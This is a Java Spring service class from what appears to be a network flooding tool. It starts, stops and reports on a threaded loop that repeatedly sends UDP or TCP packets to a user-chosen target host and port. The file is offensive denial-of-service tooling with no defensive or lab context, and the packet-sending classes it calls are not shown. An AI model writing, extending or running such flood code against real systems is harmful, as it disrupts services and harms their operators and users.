package com.onzecincocincodoet.xarlreizattacker.service;

import com.onzecincocincodoet.xarlreizattacker.dto.AttackStatus;
import com.onzecincocincodoet.xarlreizattacker.enums.Protocol;
import com.onzecincocincodoet.xarlreizattacker.exception.InvalidTargetException;
import com.onzecincocincodoet.xarlreizattacker.service.impl.TcpAttackService;
import com.onzecincocincodoet.xarlreizattacker.service.impl.UdpAttackService;
import com.onzecincocincodoet.xarlreizattacker.util.NetworkUtils;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Service;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

@Service
@RequiredArgsConstructor
public class AttackOrchestrator {
    private final UdpAttackService udpAttackService;
    private final TcpAttackService tcpAttackService;
    private final ExecutorService executor = Executors.newCachedThreadPool();
    private final AtomicBoolean attackRunning = new AtomicBoolean(false);

    public void startAttack(String target, int port, Protocol protocol) {
        if (attackRunning.get()) {
            throw new IllegalStateException("Attack already running");
        }

        if (!NetworkUtils.isValidTarget(target)) {
            throw new InvalidTargetException("Invalid target address: " + target);
        }

        attackRunning.set(true);
        AttackService service = protocol == Protocol.UDP ? udpAttackService : tcpAttackService;

        executor.submit(() -> {
            while (attackRunning.get()) {
                for (int i = 0; i < 1000 && attackRunning.get(); i++) {
                    service.sendPackets(target, port);
                }
                try {
                    Thread.sleep(10);
                } catch (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        });
    }


    public void stopAttack() {
        attackRunning.set(false);
    }

    public AttackStatus getStatus() {
        return new AttackStatus(
                attackRunning.get(),
                udpAttackService.getPacketsSent(),
                tcpAttackService.getPacketsSent()
        );
    }

    public void shutdown() {
        stopAttack();
        executor.shutdownNow();
    }
}

